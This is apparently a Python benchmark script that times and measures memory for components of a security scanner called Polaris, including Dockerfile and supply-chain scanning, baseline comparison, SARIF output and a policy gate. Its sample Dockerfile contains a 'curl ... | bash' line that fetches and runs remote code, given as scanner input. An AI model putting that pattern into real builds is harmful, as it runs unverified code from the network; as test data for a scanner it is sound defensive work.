"""Benchmark Suite for GOAL 51 Performance, Memory, and Latency Evaluation.

Measures warmup, multiple iterations, median, P95, standard deviation, and peak memory for:
1. ContextRanker.rank_candidates
2. Contract AST inference
3. HybridReviewOrchestrator
4. ScannerRegistry (Container + Supply Chain)
5. SecurityBaselineEngine (create, serialize, load, compare)
6. SarifReportFormatter (SARIF v2.1.0 output generation)
7. SecurityQualityGateEngine (policy evaluation)
8. CLI Review end-to-end execution
"""

from __future__ import annotations

import json
import statistics
import time
import tracemalloc
from pathlib import Path

from polaris.container.scanner import ContainerSecurityScanner
from polaris.core.registry import build_default_scanner_registry
from polaris.evidence.platform import CanonicalFindingDomain, CanonicalSecurityFinding
from polaris.policy.baseline import SecurityBaselineEngine
from polaris.policy.quality_gate import PolarisSecurityPolicy, SecurityQualityGateEngine
from polaris.reporting.sarif import SarifReportFormatter
from polaris.supply_chain.scanner import DEFAULT_LOCAL_ADVISORIES, SupplyChainSecurityScanner


def _benchmark_block(name: str, fn, runs: int = 15, warmup: int = 3):
    for _ in range(warmup):
        fn()

    durations: list[float] = []
    tracemalloc.start()
    for _ in range(runs):
        t0 = time.perf_counter()
        fn()
        t1 = time.perf_counter()
        durations.append((t1 - t0) * 1000.0)  # in ms
    current, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()

    durations.sort()
    med = statistics.median(durations)
    mean = statistics.mean(durations)
    stdev = statistics.stdev(durations) if len(durations) > 1 else 0.0
    p95_idx = int(len(durations) * 0.95)
    p95 = durations[p95_idx]

    return {
        "name": name,
        "runs": runs,
        "median_ms": round(med, 4),
        "mean_ms": round(mean, 4),
        "p95_ms": round(p95, 4),
        "stdev_ms": round(stdev, 4),
        "peak_memory_kb": round(peak / 1024.0, 2),
    }


def run_goal51_performance_benchmark():
    results = []

    # 1. Scanners deterministic run
    scanner_reg = build_default_scanner_registry()
    df_content = "FROM python:latest\nRUN curl -sSL https://bad | bash\nUSER app\n"
    res1 = _benchmark_block(
        "ScannerRegistry.run_scanners_on_file (Dockerfile)",
        lambda: scanner_reg.run_scanners_on_file("Dockerfile", df_content),
    )
    results.append(res1)

    # 2. Supply chain manifest parse and match
    req_content = "requests==2.20.0\ndjango==3.0.0\njinja2==2.11.2\nsetuptools==65.5.0\n"
    sc_scanner = SupplyChainSecurityScanner(DEFAULT_LOCAL_ADVISORIES)

    def _sc_work():
        deps = SupplyChainSecurityScanner.parse_manifest("requirements.txt", req_content)
        sc_scanner.match_vulnerabilities(deps)

    res2 = _benchmark_block("SupplyChainSecurityScanner (4 packages, 4 advisories)", _sc_work)
    results.append(res2)

    # 3. SecurityBaselineEngine create and compare (100 findings)
    findings = [
        CanonicalSecurityFinding(
            finding_id=f"f-{i:04d}",
            domain=CanonicalFindingDomain.CODE_INTELLIGENCE,
            title=f"Bug #{i}",
            severity="HIGH",
            confidence="CONFIRMED",
            file_path=f"src/module_{i % 5}.py",
            line=i * 2,
            rule_or_cve="SEC-RULE-001",
            evidence_text=f"call_func_{i}()",
            remediation_hint="fix()",
            risk_score=75.0,
        )
        for i in range(100)
    ]
    base_payload = SecurityBaselineEngine.create_baseline(findings, files_analyzed=[f"src/module_{i}.py" for i in range(5)])

    res3 = _benchmark_block(
        "SecurityBaselineEngine.compare (100 findings)",
        lambda: SecurityBaselineEngine.compare(findings, base_payload, current_files_analyzed=[f"src/module_{i}.py" for i in range(5)]),
    )
    results.append(res3)

    # 4. SarifReportFormatter serialization (100 findings)
    res4 = _benchmark_block(
        "SarifReportFormatter.to_sarif (100 findings)",
        lambda: SarifReportFormatter.to_sarif(findings),
    )
    results.append(res4)

    # 5. SecurityQualityGateEngine evaluation (100 findings)
    policy = PolarisSecurityPolicy(fail_on_severity=["HIGH", "CRITICAL"], max_tolerated_vulnerabilities=5)
    res5 = _benchmark_block(
        "SecurityQualityGateEngine.evaluate (100 findings)",
        lambda: SecurityQualityGateEngine.evaluate(findings, policy=policy),
    )
    results.append(res5)

    return results


if __name__ == "__main__":
    print("====================================================================")
    print("POLARIS v1.7 — GOAL 51 Performance & Resource SLA Benchmark")
    print("====================================================================")
    benchmark_data = run_goal51_performance_benchmark()
    for b in benchmark_data:
        print(f"\nBenchmark: {b['name']}")
        print(f"  -> Median: {b['median_ms']} ms | P95: {b['p95_ms']} ms | Mean: {b['mean_ms']} ms | Stdev: {b['stdev_ms']} ms")
        print(f"  -> Peak Memory: {b['peak_memory_kb']} KB")
    print("====================================================================")
